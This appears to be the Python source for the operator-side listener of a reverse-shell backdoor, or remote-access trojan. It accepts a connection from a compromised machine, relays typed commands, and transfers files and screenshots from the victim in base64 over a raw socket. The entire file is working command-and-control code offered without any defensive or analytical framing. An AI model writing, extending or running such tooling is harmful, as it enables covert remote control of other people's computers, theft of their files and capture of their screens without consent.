import json
import socket
import base64
import os

class Listener:
    def __init__(self, ip, port):
        listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listen.bind((ip, port))
        listen.listen(1)  # backlog
        print("[+]waiting for upcoming connection")
        self.connection, address = listen.accept()  # if you get a connection accept it   (return 2 values )
        print("[+]connection Established by " + str((address[0]) + " on port " + str(address[1])))
        first_statement = self.connection.recv(1024).decode("UTF-8")
        print(first_statement)

    def execute_command(self, command):
        self.serialize(command)
        return self.serialize_receive()

    def serialize(self, data):
        jason_data = json.dumps(data)
        self.connection.send(bytes(jason_data.encode()))

    def serialize_receive(self):
        jason_data = ""
        while True:
            try:
                jason_data = jason_data + self.connection.recv(1024).decode()
                return json.loads(jason_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Download successfully "

    def read_file(self, path):
        try:
            with open(path, "rb") as file:  # with b method we will only read text files
                return base64.b64encode(file.read())  # convert base64 to be to able send non ascii char (not text)
        except FileNotFoundError:
            return "[-] Error No such file ".encode()

    def user_input(self):
        while True:
            command = input("> ")
            command = command.split(" ")
            try:
                if command[0] == "exit":
                    self.serialize(command)
                    print("[-] Quiting ...")
                    exit()
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                result = self.execute_command(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

                if command[0] == "screenshot" and "[-] Error" not in result:
                    result = self.write_file("sc.png", result)
            except Exception:
                 result = "[-] Error during code Execution"
            except KeyboardInterrupt:
                exit()
            print(result)


def main():
    mylistener = Listener("127.0.0.1", 5555)
    mylistener.user_input()


if __name__ == '__main__':
    main()
